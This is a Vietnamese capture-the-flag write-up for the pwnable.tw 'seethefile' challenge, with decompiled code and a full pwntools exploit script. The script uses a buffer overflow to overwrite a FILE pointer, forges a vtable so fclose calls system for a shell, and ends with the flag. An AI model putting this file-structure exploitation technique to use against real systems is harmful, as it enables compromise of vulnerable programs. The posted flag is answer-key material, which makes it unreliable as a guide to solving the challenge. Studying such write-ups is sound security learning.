# seethefile

- 1 chall khá thú vị về IO_FILE attack
- trước khi làm chall này thì mình có lời khuyên là học qua kiểu cấu trúc io_file , io_file plus và vtable. Tài liệu mình sẽ để ở cuối chall

## Ida
- main 

```c 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char nptr[32]; // [esp+Ch] [ebp-2Ch] BYREF
  unsigned int v5; // [esp+2Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  init();
  welcome();
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%s", nptr);
    switch ( atoi(nptr) )
    {
      case 1:
        openfile();
        break;
      case 2:
        readfile();
        break;
      case 3:
        writefile();
        break;
      case 4:
        closefile();
        break;
      case 5:
        printf("Leave your name :");
        __isoc99_scanf("%s", name);
        printf("Thank you %s ,see you next time\n", name);
        if ( fp )
          fclose(fp);
        exit(0);
        return result;
      default:
        puts("Invaild choice");
        exit(0);
        return result;
    }
  }
}
```
- openfile 
```c
int openfile()
{
  if ( fp )
  {
    puts("You need to close the file first");
    return 0;
  }
  else
  {
    memset(magicbuf, 0, 0x190u);
    printf("What do you want to see :");
    __isoc99_scanf("%63s", filename);
    if ( strstr(filename, "flag") )
    {
      puts("Danger !");
      exit(0);
    }
    fp = fopen(filename, "r");
    if ( fp )
      return puts("Open Successful");
    else
      return puts("Open failed");
  }
}
```
- readfile 

```c 
size_t readfile()
{
  size_t result; // eax

  memset(magicbuf, 0, 0x190u);
  if ( !fp )
    return puts("You need to open a file first");
  result = fread(magicbuf, 0x18Fu, 1u, fp);
  if ( result )
    return puts("Read Successful");
  return result;
}
```
- writefile
```c 
int writefile()
{
  if ( strstr(filename, "flag") || strstr(magicbuf, "FLAG") || strchr(magicbuf, 125) )
  {
    puts("you can't see it");
    exit(1);
  }
  return puts(magicbuf);
}
``` 
- closefile
```c
int closefile()
{
  int result; // eax

  if ( fp )
    result = fclose(fp);
  else
    result = puts("Nothing need to close");
  fp = 0;
  return result;
}
```

## Analysis
- option 1 là fopen, nhưng ko mở file có 'flag'
- option 2 là fread data vào magicbuf
- option 3 thật ra là in ra magicbuf
- option 4 là fclose(fp)
- option 5 là có BOF, check ra thì sau name là fp, ta có thể overwrite fp để IO_FILE attack 

![image](https://github.com/gookoosss/CTF/assets/128712571/2b0f5819-90bb-400d-b342-c1b4e7f2fb71)


## Exploit
### Stage 1: leak libc
- đầu tiên ta leak libc bằng tệp `/proc/self/maps`
- cách này mình có wu giải thích trong 1 chall tương tự bên dưới
https://github.com/gookoosss/CTF/blob/main/PWN/lakectf/capture_the_flaaaaaaaaaaaaag.md
- trên server thì ta phải fread 2 lần mới leak được libc, lý do là 0x18F byte ko đủ để in tới libc base

```python 
p.sendlineafter(b'choice :', b'1')
p.sendlineafter(b'see :', b'/proc/self/maps')
p.sendlineafter(b'choice :', b'2')
p.sendlineafter(b'choice :', b'2')
p.sendlineafter(b'choice :', b'3')
p.recvuntil(b'\n')
libc.address = int(p.recv(8), 16)
print(hex(libc.address))
```
### Stage 2: IO_FILE attack
- đến đây mới là bước khó
- sau khi overwrite fp thì nó sẽ fclose(fp), vậy ta cần phải research fclose 

```c 
int
attribute_compat_text_section
_IO_old_fclose (_IO_FILE *fp)
{
  int status;

  CHECK_FILE(fp, EOF);

  /* We desperately try to help programs which are using streams in a
     strange way and mix old and new functions.  Detect new streams
     here.  */
  if (fp->_vtable_offset == 0)
    return _IO_new_fclose (fp);

  /* First unlink the stream.  */
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    _IO_un_link ((struct _IO_FILE_plus *) fp);

  _IO_acquire_lock (fp);
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    status = _IO_old_file_close_it (fp);
  else
    status = fp->_flags & _IO_ERR_SEEN ? -1 : 0;
  _IO_release_lock (fp);
  _IO_FINISH (fp);
  if (_IO_have_backup (fp))
    _IO_free_backup_area (fp);
  if (fp != _IO_stdin && fp != _IO_stdout && fp != _IO_stderr)
    {
      fp->_IO_file_flags = 0;
      free(fp);
    }

  return status;
}
```
- target của ta là `_IO_FINISH`, vì `_IO_FINISH` nằm trong `vtable`(còn gọi là `_IO_jump_t`), ta có thể overwrite nó thành địa chỉ ta muốn trỏ đến nó
```c 
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish); # target
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
```
- để đến đươc `_IO_FINISH`, ta cần bypass qua ` _IO_un_link ((struct _IO_FILE_plus *) fp)` và `_IO_old_file_close_it (fp)`, lý do là 2 hàm này sẽ làm chương trình dừng trước khi ta lấy được shell, muốn biết chi tiết hơn thì mình có gán link ở cuối chall
- vậy ta cần set cho `_IO_IS_FILEBUF` là 0 là sẽ bypass qua 2 hàm trên , mặc định `_IO_IS_FILEBUF` là 0x2000 rồi, ta sẽ set nó thành 0xffffdfff
```
#define _IO_IS_FILEBUF 0x2000
```
- sau 0xffffdfff là `;/bin/sh\0` (hoặc là `;$0\0`) để set lệnh thực thi tiếp theo 
- ý tưởng payload của ta sẽ hình dung như thế này 

![image](https://github.com/gookoosss/CTF/assets/128712571/fade809a-52e9-4b0f-b46c-d5b8c5c9247f)


- dựa trên ý tưởng trên ta sẽ viết được payload như sau 
```c 
payload = p32(0xffffdfff) + b';$0\0' # name 
payload = payload.ljust(0x20, b'a') # padding 
payload += p32(exe.sym.name) # *fp , overwrite *fp to point to name 
payload = payload.ljust(76, b'a') # padding 
# payload += p32(exe.sym.filename + 16) # bypass file->_lock (no need)
payload += p32(exe.sym.name + 72) # file->vtable = name + 72 + 8
payload += p32(libc.sym.system) # name + 80
p.sendlineafter(b'name :', payload)
```
- chạy trên server và ta đã lấy được shell 
- lấy được shell rồi ta phải giải thêm 1 chall baby nữa để có flag :))

![image](https://github.com/gookoosss/CTF/assets/128712571/40e7d3ea-8bb3-4dd0-b836-e96bd07ccc05)

## script 

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./seethefile_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


# p = process([exe.path])
# gdb.attach(p, gdbscript = '''
# b*0x08048ae0
# c
# ''')

# input()
p = remote('chall.pwnable.tw', 10200)
fp = 0x804b280

p.sendlineafter(b'choice :', b'1')
p.sendlineafter(b'see :', b'/proc/self/maps')
p.sendlineafter(b'choice :', b'2')
p.sendlineafter(b'choice :', b'2')
p.sendlineafter(b'choice :', b'3')
p.recvuntil(b'\n')
libc.address = int(p.recv(8), 16)
print(hex(libc.address))
p.sendlineafter(b'choice :', b'5')


payload = p32(0xffffdfff) + b';$0\0' # name 
payload = payload.ljust(0x20, b'a') # padding 
payload += p32(exe.sym.name) # *fp , overwrite *fp to point to name 
payload = payload.ljust(76, b'a') # padding 
# payload += p32(exe.sym.filename + 16) # bypass file->_lock (no need)
payload += p32(exe.sym.name + 72) # file->vtable = name + 72 + 8
payload += p32(libc.sym.system) # name + 80
p.sendlineafter(b'name :', payload)


p.interactive()

#FLAG{F1l3_Str34m_is_4w3s0m3}
```

## Flag
FLAG{F1l3_Str34m_is_4w3s0m3}

## Reference
IO_FILE: https://chovid99.github.io/posts/file-structure-attack-part-1/?fbclid=IwAR2m47xqXnsDEZwTIV1ncbG2DjgJoUn58XLnfXXAZbRAmGW7aJdelSwOrxA
fclose: https://www.jianshu.com/p/2e00afb01606
writeup: https://www.jianshu.com/p/0176ebe02354?fbclid=IwAR1tDLFTUdOpxztl1M6AwNnDt_Ywg6pfb_58B_E9F52xEfrn-ALEdazlOgA
writeup: https://blog.srikavin.me/posts/pwnable-tw-seethefile/
CTF_wiki: https://ctf-wiki.mahaloz.re/pwn/linux/io_file/introduction/
